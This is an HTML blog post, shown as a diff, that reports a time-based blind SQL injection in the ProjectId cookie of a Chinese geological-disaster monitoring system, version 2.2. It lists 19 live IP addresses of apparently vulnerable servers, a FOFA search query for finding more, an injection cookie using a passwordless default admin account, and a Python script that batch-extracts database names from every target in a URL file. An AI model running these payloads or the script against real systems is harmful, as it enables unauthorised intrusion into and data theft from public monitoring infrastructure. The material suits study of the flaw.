@@ -1,0 +1,201 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>CVE Application - SQL Injection-2 | Drblack'Blog</title><meta name="author" content="Drblack"><meta name="copyright" content="Drblack"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="华测监测预警系统2.2 SQL injection vulnerability existsThe official website of the company to which the vulnerability belongs：http:&#x2F;&#x2F;www.huace.cn&#x2F; The following addresses can prove the existence of this vulner">
+<meta property="og:type" content="article">
+<meta property="og:title" content="CVE Application - SQL Injection-2">
+<meta property="og:url" content="https://drblack.top/2024/01/05/%E5%8D%8E%E6%B5%8B%E7%9B%91%E6%B5%8B%E9%A2%84%E8%AD%A6%E7%B3%BB%E7%BB%9F2.2%E5%AD%98%E5%9C%A8sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E_2/index.html">
+<meta property="og:site_name" content="Drblack&#39;Blog">
+<meta property="og:description" content="华测监测预警系统2.2 SQL injection vulnerability existsThe official website of the company to which the vulnerability belongs：http:&#x2F;&#x2F;www.huace.cn&#x2F; The following addresses can prove the existence of this vulner">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://drblack.top/img/1000.webp">
+<meta property="article:published_time" content="2024-01-05T07:02:41.000Z">
+<meta property="article:modified_time" content="2024-01-05T09:01:15.667Z">
+<meta property="article:author" content="Drblack">
+<meta property="article:tag" content="知识点">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://drblack.top/img/1000.webp"><link rel="shortcut icon" href="/img/1000.webp"><link rel="canonical" href="https://drblack.top/2024/01/05/%E5%8D%8E%E6%B5%8B%E7%9B%91%E6%B5%8B%E9%A2%84%E8%AD%A6%E7%B3%BB%E7%BB%9F2.2%E5%AD%98%E5%9C%A8sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E_2/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><meta name="google-site-verification" content="8KYdLccZEOQiOgJvHftvX7-2pkkmhBMvMXO4inbIkLw"/><meta name="baidu-site-verification" content="codeva-t56Dl5qqYL"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: undefined,
+  translate: undefined,
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  dateSuffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'fancybox',
+  Snackbar: undefined,
+  source: {
+    justifiedGallery: {
+      js: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.js',
+      css: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.css'
+    }
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: false,
+  },
+  autoDarkmode: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: 'CVE Application - SQL Injection-2',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2024-01-05 17:01:15'
+}</script><noscript><style type="text/css">
+  #nav {
+    opacity: 1
+  }
+  .justified-gallery img {
+    opacity: 1
+  }
+
+  #recent-posts time,
+  #post-meta time {
+    display: inline !important
+  }
+</style></noscript><script>(win=>{
+    win.saveToLocal = {
+      set: function setWithExpiry(key, value, ttl) {
+        if (ttl === 0) return
+        const now = new Date()
+        const expiryDay = ttl * 86400000
+        const item = {
+          value: value,
+          expiry: now.getTime() + expiryDay,
+        }
+        localStorage.setItem(key, JSON.stringify(item))
+      },
+
+      get: function getWithExpiry(key) {
+        const itemStr = localStorage.getItem(key)
+
+        if (!itemStr) {
+          return undefined
+        }
+        const item = JSON.parse(itemStr)
+        const now = new Date()
+
+        if (now.getTime() > item.expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return item.value
+      }
+    }
+  
+    win.getScript = url => new Promise((resolve, reject) => {
+      const script = document.createElement('script')
+      script.src = url
+      script.async = true
+      script.onerror = reject
+      script.onload = script.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        script.onload = script.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(script)
+    })
+  
+    win.getCSS = (url,id = false) => new Promise((resolve, reject) => {
+      const link = document.createElement('link')
+      link.rel = 'stylesheet'
+      link.href = url
+      if (id) link.id = id
+      link.onerror = reject
+      link.onload = link.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        link.onload = link.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(link)
+    })
+  
+      win.activateDarkMode = function () {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = function () {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+          if (t === 'dark') activateDarkMode()
+          else if (t === 'light') activateLightMode()
+        
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    
+    const detectApple = () => {
+      if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+    })(window)</script><link rel="stylesheet" href="/css/custom.css" media="defer" onload="this.media='all'"><meta name="generator" content="Hexo 6.3.0"></head><body><script>window.paceOptions = {
+  restartOnPushState: false
+}
+
+document.addEventListener('pjax:send', () => {
+  Pace.restart()
+})
+</script><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/pace-js/themes/blue/pace-theme-minimal.min.css"/><script src="https://cdn.jsdelivr.net/npm/pace-js/pace.min.js"></script><div id="web_bg"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="/img/1000.webp" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">19</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">5</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">0</div></a></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首頁</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 時間軸</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 標籤</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分類</span></a></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fa fa-heartbeat"></i><span> 清單</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/music/"><i class="fa-fw fas fa-music"></i><span> 音樂</span></a></li><li><a class="site-page child" href="/Gallery/"><i class="fa-fw fas fa-images"></i><span> 照片</span></a></li><li><a class="site-page child" href="/movies/"><i class="fa-fw fas fa-video"></i><span> 電影</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友鏈</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 關於</span></a></div><div class="menus_item"><a class="site-page" href="/sitemap.xml"><i class="fa-fw sitemap"></i><span> sitemap</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header"><nav id="nav"><span id="blog-info"><a href="/" title="Drblack'Blog"><span class="site-name">Drblack'Blog</span></a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首頁</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 時間軸</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 標籤</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分類</span></a></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fa fa-heartbeat"></i><span> 清單</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/music/"><i class="fa-fw fas fa-music"></i><span> 音樂</span></a></li><li><a class="site-page child" href="/Gallery/"><i class="fa-fw fas fa-images"></i><span> 照片</span></a></li><li><a class="site-page child" href="/movies/"><i class="fa-fw fas fa-video"></i><span> 電影</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友鏈</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 關於</span></a></div><div class="menus_item"><a class="site-page" href="/sitemap.xml"><i class="fa-fw sitemap"></i><span> sitemap</span></a></div></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">CVE Application - SQL Injection-2</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2024-01-05T07:02:41.000Z" title="发表于 2024-01-05 15:02:41">2024-01-05</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2024-01-05T09:01:15.667Z" title="更新于 2024-01-05 17:01:15">2024-01-05</time></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">字数总计:</span><span class="word-count">926</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">阅读时长:</span><span>5分钟</span></span><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="CVE Application - SQL Injection-2"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h1 id="华测监测预警系统2-2-SQL-injection-vulnerability-exists"><a href="#华测监测预警系统2-2-SQL-injection-vulnerability-exists" class="headerlink" title="华测监测预警系统2.2 SQL injection vulnerability exists"></a>华测监测预警系统2.2 SQL injection vulnerability exists</h1><p>The official website of the company to which the vulnerability belongs：<a target="_blank" rel="noopener" href="http://www.huace.cn/">http://www.huace.cn/</a></p>
+<p>The following addresses can prove the existence of this vulnerability</p>
+<p><a target="_blank" rel="noopener" href="http://124.71.143.18:8001/">http://124.71.143.18:8001/</a><br><a target="_blank" rel="noopener" href="http://1.25.18.178:8001/">http://1.25.18.178:8001/</a><br><a target="_blank" rel="noopener" href="http://121.18.47.130:6006/">http://121.18.47.130:6006/</a><br><a target="_blank" rel="noopener" href="http://116.178.229.233:8001/">http://116.178.229.233:8001/</a><br><a target="_blank" rel="noopener" href="http://124.118.20.91:8001/">http://124.118.20.91:8001/</a><br><a target="_blank" rel="noopener" href="http://116.248.189.171:8001/">http://116.248.189.171:8001/</a><br><a target="_blank" rel="noopener" href="http://58.18.37.89:7003/">http://58.18.37.89:7003/</a><br><a target="_blank" rel="noopener" href="http://223.13.121.131:8001/">http://223.13.121.131:8001/</a><br><a target="_blank" rel="noopener" href="http://183.94.147.11:8001/">http://183.94.147.11:8001/</a><br><a target="_blank" rel="noopener" href="http://61.136.230.80:8001/">http://61.136.230.80:8001/</a><br><a target="_blank" rel="noopener" href="http://121.21.108.115:8001/">http://121.21.108.115:8001/</a><br><a target="_blank" rel="noopener" href="http://211.144.120.100:8001/">http://211.144.120.100:8001/</a><br><a target="_blank" rel="noopener" href="http://36.26.75.111:8001/">http://36.26.75.111:8001/</a><br><a target="_blank" rel="noopener" href="http://60.2.69.246:12000/">http://60.2.69.246:12000/</a><br><a target="_blank" rel="noopener" href="http://117.176.87.48:8001/">http://117.176.87.48:8001/</a><br><a target="_blank" rel="noopener" href="http://220.179.193.11:5007/">http://220.179.193.11:5007/</a><br><a target="_blank" rel="noopener" href="http://1.30.219.61:7006/">http://1.30.219.61:7006/</a><br><a target="_blank" rel="noopener" href="http://60.2.64.10:12000/">http://60.2.64.10:12000/</a><br><a target="_blank" rel="noopener" href="http://1.30.219.61:7005/">http://1.30.219.61:7005/</a></p>
+<h2 id="Vulnerability-Description"><a href="#Vulnerability-Description" class="headerlink" title="Vulnerability Description"></a>Vulnerability Description</h2><p>CTI Monitoring Integration Division makes full use of its technological accumulation in geological disaster monitoring to establish a scientific and complete geological disaster monitoring and early warning platform, realizing scientific, informatization, standardization and visualization of geological disaster prevention and control management. The product version 2.2 url:&#x2F;Handler&#x2F;Ajax.ashx?oper&#x3D;getProjectAllInfo, the ProjectId parameter in the cookie has a sql injection vulnerability.</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/Handler/Ajax.ashx?oper=getProjectAllInfo</span><br></pre></td></tr></table></figure>
+
+<p>The request cookies</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>ProjectId=1waitfor delay&#x27;0:0:5&#x27;--; WebUserID=1; WebUserAccount=admin; WebUserName=%e7%ae%a1%e7%90%86%e5%91%98; ManageUnit=;</span><br></pre></td></tr></table></figure>
+
+<h2 id="Vulnerability-point-details"><a href="#Vulnerability-point-details" class="headerlink" title="Vulnerability point details"></a>Vulnerability point details</h2><p><a target="_blank" rel="noopener" href="http://www.fofa.info/">www.FOFA.info</a> syntax：”华测监测预警系统2.2”</p>
+<p><img src="/images/wps1.jpg" alt="img"> </p>
+<p>It can be considered as an unauthorized vulnerability because the system defaults to an admin user, which does not require a password to be carried in the cookie. Therefore, without entering the background, the following content is added:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Cookie: ProjectId=1waitfor delay&#x27;0:0:5&#x27;--; WebUserID=1; WebUserAccount=admin; WebUserName=%e7%ae%a1%e7%90%86%e5%91%98; ManageUnit=;</span><br></pre></td></tr></table></figure>
+
+
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/Handler/Ajax.ashx?oper=getProjectAllInfo</span><br></pre></td></tr></table></figure>
+
+<p><strong>Case 1：<a target="_blank" rel="noopener" href="http://124.118.20.91:8001/">http://124.118.20.91:8001/</a></strong></p>
+<p>After adding the cookie information mentioned above, request the corresponding webpage and send the constructed post request package. It was found that the interface has a delay of 5 seconds. Considering the existence of SQL blind injection vulnerability, use a script to read the database for verification.</p>
+<p>  <img src="/images/wps2.jpg" alt="img"></p>
+<p><strong>Case 2：1.25.18.178:8001</strong></p>
+<p>After adding the cookie information mentioned above, request the corresponding webpage and send the constructed post request package. It was found that the interface has a delay of 5 seconds. Considering the existence of SQL blind injection vulnerability, use a script to read the database for verification.</p>
+<p><img src="/images/wps3.jpg" alt="img"></p>
+<p><strong>Case 3：121.18.47.130:6006</strong>  </p>
+<p><img src="/images/wps4.jpg" alt="img"></p>
+<p>After adding the cookie information mentioned above, request the corresponding webpage and send the constructed post request package. It was found that the interface has a delay of 5 seconds. Considering the existence of SQL blind injection vulnerability, use a script to read the database for verification.</p>
+<h2 id="Script-batch-validation"><a href="#Script-batch-validation" class="headerlink" title="Script batch validation"></a>Script batch validation</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># coding:utf-8</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line">headers = &#123;<span class="string">&quot;User-Agent&quot;</span>: <span class="string">&quot;Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36&quot;</span>&#125;</span><br><span class="line"></span><br><span class="line">databases = []</span><br><span class="line">length = []</span><br><span class="line">file = <span class="built_in">open</span>(<span class="string">&quot;url.txt&quot;</span>,<span class="string">&quot;r&quot;</span>)</span><br><span class="line">lines = file.readlines()</span><br><span class="line"><span class="keyword">for</span> baseurl <span class="keyword">in</span> lines:</span><br><span class="line">    baseurl = baseurl.strip(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">    url = baseurl+<span class="string">&quot;Handler/Ajax.ashx?oper=getProjectAllInfo&quot;</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;正在测试&quot;</span>+url)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;--------------------&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;正在匹配&quot;</span><span class="string">&quot;数据库长度&quot;</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">50</span>):</span><br><span class="line">        <span class="comment">#cookies = &#123;&quot;Cookies&quot;: &quot;ProjectId=1\&#x27; if(len((select db_name())))&gt;1 waitfor delay \&#x27;0:0:4\&#x27; --; WebUserID=0; WebUserAccount=admin; WebUserName=%e7%ae%a1%e7%90%86%e5%91%98; ManageUnit=;&quot;&#125;</span></span><br><span class="line">        cookies = &#123;<span class="string">&quot;ProjectId&quot;</span>: <span class="string">f&quot;1 if(len((select db_name())))&gt;<span class="subst">&#123;i&#125;</span> waitfor delay &#x27;0:0:2&#x27; --&quot;</span>, <span class="string">&quot;WebUserID&quot;</span>: <span class="string">&quot;0&quot;</span>,</span><br><span class="line">                   <span class="string">&quot;WebUserAccount&quot;</span>: <span class="string">&quot;admin&quot;</span>, <span class="string">&quot;WebUserName&quot;</span>: <span class="string">&quot;%e7%ae%a1%e7%90%86%e5%91%98&quot;</span>, <span class="string">&quot;ManageUnit&quot;</span>: <span class="string">&quot;&quot;</span>&#125;</span><br><span class="line">        <span class="comment">#print(cookies)</span></span><br><span class="line">        start_time0 = time.time()</span><br><span class="line">        rsp0 = requests.get(url, headers=headers, cookies=cookies)</span><br><span class="line">        <span class="keyword">if</span> time.time() - start_time0 &lt; <span class="number">2</span>:</span><br><span class="line">            length.append(i)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;目标&quot;</span>+baseurl+<span class="string">&quot;的数据库长度为&quot;</span> + <span class="built_in">str</span>(i))</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line">   <span class="comment"># payload_dbname =&quot;/Handler/Ajax.ashx?oper=deleteMonitorDevicePosition&amp;monitorType=1&#x27;;if(ascii(substring((select db_name()),&#123;0&#125;,1)))&gt;&#123;1&#125; waitfor delay &#x27;0:0:2&#x27; --&amp;deviceId=-1&amp;level=-1&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;正在测试数据库名称&quot;</span>)</span><br><span class="line">    databasename = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, length[<span class="number">0</span>] + <span class="number">1</span>):</span><br><span class="line">        min_value = <span class="number">48</span></span><br><span class="line">        max_value = <span class="number">122</span></span><br><span class="line">        mid = (min_value + max_value) // <span class="number">2</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span> (min_value &lt; max_value):</span><br><span class="line">            cookies = &#123;<span class="string">&quot;ProjectId&quot;</span>: <span class="string">f&quot;1 if(ascii(substring((select db_name()),<span class="subst">&#123;i&#125;</span>,1)))&gt;<span class="subst">&#123;mid&#125;</span> waitfor delay &#x27;0:0:3&#x27; --&quot;</span>,</span><br><span class="line">                       <span class="string">&quot;WebUserID&quot;</span>: <span class="string">&quot;0&quot;</span>,</span><br><span class="line">                       <span class="string">&quot;WebUserAccount&quot;</span>: <span class="string">&quot;admin&quot;</span>, <span class="string">&quot;WebUserName&quot;</span>: <span class="string">&quot;%e7%ae%a1%e7%90%86%e5%91%98&quot;</span>, <span class="string">&quot;ManageUnit&quot;</span>: <span class="string">&quot;&quot;</span>&#125;<span class="comment">#</span></span><br><span class="line">            start_time = time.time()</span><br><span class="line">            rsp = requests.get(url, headers=headers,cookies=cookies)</span><br><span class="line">            <span class="keyword">if</span> time.time() - start_time &gt; <span class="number">2</span>:</span><br><span class="line">                min_value = mid + <span class="number">1</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                max_value = mid</span><br><span class="line">                <span class="keyword">pass</span></span><br><span class="line">            mid = (min_value + max_value) // <span class="number">2</span></span><br><span class="line">        databasename += <span class="built_in">chr</span>(mid)</span><br><span class="line">        <span class="built_in">print</span>(databasename)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;目标&quot;</span>+baseurl+<span class="string">&quot;数据库名为&quot;</span>+databasename)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;-------------------------&quot;</span>)</span><br><span class="line">    <span class="comment">#databases.append(databasename)</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="https://drblack.top">Drblack</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="https://drblack.top/2024/01/05/%E5%8D%8E%E6%B5%8B%E7%9B%91%E6%B5%8B%E9%A2%84%E8%AD%A6%E7%B3%BB%E7%BB%9F2.2%E5%AD%98%E5%9C%A8sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E_2/">https://drblack.top/2024/01/05/%E5%8D%8E%E6%B5%8B%E7%9B%91%E6%B5%8B%E9%A2%84%E8%AD%A6%E7%B3%BB%E7%BB%9F2.2%E5%AD%98%E5%9C%A8sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E_2/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="https://drblack.top" target="_blank">Drblack'Blog</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/%E7%9F%A5%E8%AF%86%E7%82%B9/">知识点</a></div><div class="post_share"><div class="social-share" data-image="/img/1000.webp" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2024/01/05/%E5%8D%8E%E6%B5%8B%E7%9B%91%E6%B5%8B%E9%A2%84%E8%AD%A6%E7%B3%BB%E7%BB%9F2.2%E5%AD%98%E5%9C%A8sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/" title="CVE Application - SQL Injection"><div class="cover" style="background: var(--default-bg-color)"></div><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">CVE Application - SQL Injection</div></div></a></div><div class="next-post pull-right"><a href="/2023/11/12/Vuln-stack%203/" title="VulnStack Pass-3"><div class="cover" style="background: var(--default-bg-color)"></div><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">VulnStack Pass-3</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><div><a href="/2023/11/02/Kerberos%E5%8D%8F%E8%AE%AE/" title="Kerberos协议分析（数据包）"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-11-02</div><div class="title">Kerberos协议分析（数据包）</div></div></a></div><div><a href="/2023/11/08/PTH%E3%80%81PTK%E3%80%81PTT%E6%94%BB%E5%87%BB%E6%80%BB%E7%BB%93/" title="PTH、PTT、PTK 攻击总结"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-11-08</div><div class="title">PTH、PTT、PTK 攻击总结</div></div></a></div><div><a href="/2023/09/08/MAC%E5%AF%BC%E5%85%A5%E9%9D%B6%E6%9C%BA/" title="MAC导入红日靶机"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-09-08</div><div class="title">MAC导入红日靶机</div></div></a></div><div><a href="/2023/05/25/Nginx%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%8F%8A%E5%8E%9F%E7%90%86%E6%B5%85%E6%9E%90/" title="Nginx解析漏洞复现及原理解析"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-05-25</div><div class="title">Nginx解析漏洞复现及原理解析</div></div></a></div><div><a href="/2023/05/20/%E4%B8%80%E6%AE%B5%E7%AE%80%E8%BF%B0/" title="一段简述"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-05-20</div><div class="title">一段简述</div></div></a></div><div><a href="/2023/11/01/%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/" title="内网信息搜集"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-11-01</div><div class="title">内网信息搜集</div></div></a></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="/img/1000.webp" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">Drblack</div><div class="author-info__description">努力就会一直幸运</div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">19</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">5</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">0</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/drblack000"><i class="fab fa-github"></i><span>Follow Me</span></a><div class="card-info-social-icons is-center"><a class="social-icon" href="https://github.com/Drblack000" target="_blank" title="Github"><i class="fab fa-github" style="color: #24292e;"></i></a><a class="social-icon" href="mailto:drblack_di@163.com" target="_blank" title="Email"><i class="fas fa-envelope" style="color: #4a7dbe;"></i></a></div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" 